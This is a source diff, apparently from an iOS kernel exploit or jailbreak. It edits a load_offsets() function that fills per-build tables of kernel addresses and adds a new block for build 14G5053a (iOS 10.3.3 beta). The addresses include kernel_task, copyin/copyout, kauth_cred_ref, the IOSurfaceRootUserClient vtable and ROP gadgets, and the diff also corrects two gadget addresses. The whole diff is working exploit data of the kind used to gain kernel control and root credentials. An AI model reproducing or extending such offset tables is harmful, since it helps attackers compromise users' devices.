@@ -6598,10 +6598,9 @@ int load_offsets(void)
             OFFSET_IPC_KOBJECT_SET                 = 0xfffffff0070f27a4;
             OFFSET_IPC_PORT_MAKE_SEND              = 0xfffffff0070dec80;
             OFFSET_IOSURFACEROOTUSERCLIENT_VTAB    = 0xfffffff006e521e0;
-            OFFSET_ROP_ADD_X0_X0_0x10              = 0x00b592b8;
+            OFFSET_ROP_ADD_X0_X0_0x10              = 0xfffffff0063e529c;
             OFFSET_OSSERIALIZER_SERIALIZE          = 0xfffffff007491a60;
-            OFFSET_ROP_LDR_X0_X0_0x10              = 0x002618a8;
-            
+            OFFSET_ROP_LDR_X0_X0_0x10              = 0xfffffff006330ab8;
             
         }
         // 10.2
@@ -6995,8 +6994,28 @@ int load_offsets(void)
             OFFSET_ROP_ADD_X0_X0_0x10              = 0xfffffff0063c5398;
             OFFSET_OSSERIALIZER_SERIALIZE          = 0xfffffff007486a14;
             OFFSET_ROP_LDR_X0_X0_0x10              = 0xfffffff006310a84;
-            
-            
+        }
+        // 10.3.3 b4
+        if (!strcmp(osversion, "14G5053a"))
+        {
+            OFFSET_ZONE_MAP                        = 0xfffffff007590478;
+            OFFSET_KERNEL_MAP                      = 0xfffffff0075ec050;
+            OFFSET_KERNEL_TASK                     = 0xfffffff0075ec048;
+            OFFSET_REALHOST                        = 0xfffffff007572ba0;
+            OFFSET_BZERO                           = 0xfffffff0070c1f80;
+            OFFSET_BCOPY                           = 0xfffffff0070c1dc0;
+            OFFSET_COPYIN                          = 0xfffffff0071c5db4;
+            OFFSET_COPYOUT                         = 0xfffffff0071c6094;
+            OFFSET_ROOTVNODE                       = 0xfffffff0075ec0b0;
+            OFFSET_CHGPROCCNT                      = 0xfffffff0073d38e4;
+            OFFSET_KAUTH_CRED_REF                  = 0xfffffff0073adc68;
+            OFFSET_IPC_PORT_ALLOC_SPECIAL          = 0xfffffff0070deff4;
+            OFFSET_IPC_KOBJECT_SET                 = 0xfffffff0070f22cc;
+            OFFSET_IPC_PORT_MAKE_SEND              = 0xfffffff0070deb18;
+            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB    = 0xfffffff006e4a238;
+            OFFSET_ROP_ADD_X0_X0_0x10              = 0xfffffff0063c5398;
+            OFFSET_OSSERIALIZER_SERIALIZE          = 0xfffffff007486a14;
+            OFFSET_ROP_LDR_X0_X0_0x10              = 0xfffffff006310a84;
         }
         // 10.3.2
         if(!strcmp(osversion, "14F89"))
